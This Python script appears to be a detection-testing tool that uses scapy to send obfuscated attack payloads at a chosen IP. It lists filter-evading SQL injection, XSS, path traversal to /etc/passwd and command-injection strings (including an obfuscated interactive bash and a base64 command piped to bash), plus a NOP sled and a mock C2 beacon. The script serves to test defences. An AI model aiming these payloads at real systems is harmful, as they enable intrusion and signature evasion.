#!/usr/bin/env python3
"""
SUDOSOC Advanced "Wired" Attack Simulator
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
This script generates obfuscated (wired) payloads designed to:
1. Bypass Layer 1 Heuristics (literal string signatures).
2. Trigger Layer 2 ML/Model (behavioral and contextual analysis).

RUN AS ADMINISTRATOR for best results.
"""

import sys
import time
import random
import argparse
from scapy.all import IP, TCP, UDP, Raw, send, conf

# --- Configuration ---
DEFAULT_TARGET = "127.0.0.1"
SUSPICIOUS_PORTS = [4444, 1337, 31337, 5555, 6667, 9001]
WEB_PORTS = [80, 443, 8080, 5000]

# --- Colors ---
class Colors:
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    RESET = "\033[0m"

def log_info(msg): print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")
def log_success(msg): print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")
def log_warn(msg): print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")
def log_error(msg): print(f"{Colors.RED}[-]{Colors.RESET} {msg}")

# --- Attack Payload Generators ---

def get_wired_sqli():
    """Bypasses 'UNION SELECT' using comment-injection and fragmentation."""
    variants = [
        "UNI/**/ON SEL/**/ECT 1,2,3,4,5--",
        "UNunionION SELselectECT user,password FROM users--",
        "' OR '1'='1' /*",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "%55%4e%49%4f%4e %53%45%4c%45%43%54" # Hex encoded UNION SELECT
    ]
    return random.choice(variants)

def get_wired_xss():
    """Bypasses '<script' and 'onerror=' using alternative tags and handlers."""
    variants = [
        "<svg/onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<img src=x onmouseover=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">"
    ]
    return random.choice(variants)

def get_wired_traversal():
    """Bypasses '../../' and '/etc/passwd'."""
    variants = [
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/var/www/html/../../../etc/passwd"
    ]
    return random.choice(variants)

def get_wired_cmd_injection():
    """Bypasses 'cmd.exe', 'powershell', '/bin/bash'."""
    variants = [
        "c^m^d.e^x^e /c whoami",
        "pow\"\"ershell -ExecutionPolicy Bypass",
        "/bi${SHLVL}n/ba${HOSTNAME:0:1}h -i", # Linux obfuscation
        "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash",
        "python3 -c 'import os;os.system(\"whoami\")'"
    ]
    return random.choice(variants)

def get_wired_nop_sled():
    """Bypasses '\x90' * 8 using polymorphic NOPs."""
    # Common 1-byte NOP equivalents in x86
    nops = [b"\x90", b"\x41", b"\x42", b"\x43", b"\x44", b"\x45", b"\x46", b"\x47", b"\x48", b"\x93", b"\x97"]
    sled = b"".join(random.choice(nops) for _ in range(32))
    return sled + b"\xcc\xcc\xcc\xcc" # Append some breakpoints

def get_high_entropy_data(size=1024):
    """Generates random data that looks like encrypted traffic or an anomaly."""
    return bytes([random.randint(0, 255) for _ in range(size)])

# --- Execution Logic ---

def send_attack(target_ip, target_port, payload, name, protocol="TCP"):
    log_info(f"Simulating {name} on {target_ip}:{target_port} [{protocol}]")
    
    # If payload is string, encode to bytes
    if isinstance(payload, str):
        payload_bytes = payload.encode('utf-8')
    else:
        payload_bytes = payload

    try:
        if protocol == "TCP":
            # Send a basic SYN then the Data (simulating a simple connection + payload)
            pkt = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
            send(pkt, verbose=False)
            
            pkt = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/Raw(load=payload_bytes)
            send(pkt, verbose=False)
        else:
            pkt = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=payload_bytes)
            send(pkt, verbose=False)
            
        log_success(f"Sent {len(payload_bytes)} bytes of 'wired' payload.")
    except Exception as e:
        log_error(f"Failed to send packet: {e}")

def run_menu(target_ip):
    while True:
        print(f"\n{Colors.CYAN}=========================================={Colors.RESET}")
        print(f"   {Colors.CYAN}WIRED ATTACK SIMULATOR (Layer 2 Tester){Colors.RESET}")
        print(f"{Colors.CYAN}=========================================={Colors.RESET}")
        print(f"Target IP: {target_ip}")
        print("1. Wired SQL Injection (Bypass 'UNION SELECT')")
        print("2. Wired XSS (Bypass '<script')")
        print("3. Wired Path Traversal (Bypass '../../')")
        print("4. Wired Command Injection (Bypass 'cmd.exe', 'bash')")
        print("5. Polymorphic NOP Sled (Bypass '\\x90*8')")
        print("6. High-Entropy Anomaly (Trigger ML Anomaly)")
        print("7. Stealthy C2 Beacon (Suspicious Port + Low Volume)")
        print("8. Change Target IP")
        print("9. Exit")
        print(f"{Colors.CYAN}------------------------------------------{Colors.RESET}")
        
        choice = input("Select an attack (1-9): ").strip()
        
        if choice == "1":
            send_attack(target_ip, 80, get_wired_sqli(), "Obfuscated SQLi")
        elif choice == "2":
            send_attack(target_ip, 80, get_wired_xss(), "Obfuscated XSS")
        elif choice == "3":
            send_attack(target_ip, 80, get_wired_traversal(), "Mangled Path Traversal")
        elif choice == "4":
            send_attack(target_ip, 80, get_wired_cmd_injection(), "Evasive Command Injection")
        elif choice == "5":
            send_attack(target_ip, 4444, get_wired_nop_sled(), "Polymorphic NOP Sled")
        elif choice == "6":
            # Send to a random high port to look like an anomaly
            port = random.randint(10000, 60000)
            send_attack(target_ip, port, get_high_entropy_data(2048), "High-Entropy Anomaly", "UDP")
        elif choice == "7":
            # Beacon to port 4444 with very little data
            port = 4444
            for i in range(3):
                send_attack(target_ip, port, b"ping", f"Stealthy C2 Beacon #{i+1}")
                time.sleep(2)
        elif choice == "8":
            new_target = input("Enter new target IP: ").strip()
            if new_target: target_ip = new_target
        elif choice == "9":
            log_info("Exiting simulator.")
            break
        else:
            log_warn("Invalid choice.")

def run_attack_once(target_ip: str, choice: str) -> None:
    """Non-interactive entry point (useful for automation/tests)."""
    if choice == "1":
        send_attack(target_ip, 80, get_wired_sqli(), "Obfuscated SQLi")
    elif choice == "2":
        send_attack(target_ip, 80, get_wired_xss(), "Obfuscated XSS")
    elif choice == "3":
        send_attack(target_ip, 80, get_wired_traversal(), "Mangled Path Traversal")
    elif choice == "4":
        send_attack(target_ip, 80, get_wired_cmd_injection(), "Evasive Command Injection")
    elif choice == "5":
        send_attack(target_ip, 4444, get_wired_nop_sled(), "Polymorphic NOP Sled")
    elif choice == "6":
        port = random.randint(10000, 60000)
        send_attack(target_ip, port, get_high_entropy_data(2048), "High-Entropy Anomaly", "UDP")
    elif choice == "7":
        port = 4444
        for i in range(3):
            send_attack(target_ip, port, b"ping", f"Stealthy C2 Beacon #{i+1}")
            time.sleep(2)
    else:
        raise ValueError("choice must be 1-7")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Wired Attack Simulator")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target IP address")
    parser.add_argument("--attack", default="", help="Non-interactive: pick attack 1-7 and exit")
    parser.add_argument("--repeat", type=int, default=1, help="Repeat non-interactive attack N times")
    args = parser.parse_args()

    # Check for admin rights
    import ctypes, os, platform
    is_admin = False
    if platform.system() == "Windows":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        is_admin = os.geteuid() == 0

    if not is_admin:
        log_warn("Not running as Administrator/Root! Scapy may fail to send raw packets.")
        log_warn("Run with sudo or as Administrator for best results.")
        print()

    if str(args.attack).strip():
        n = max(1, int(args.repeat or 1))
        for _ in range(n):
            run_attack_once(args.target, str(args.attack).strip())
            time.sleep(0.3)
    else:
        run_menu(args.target)
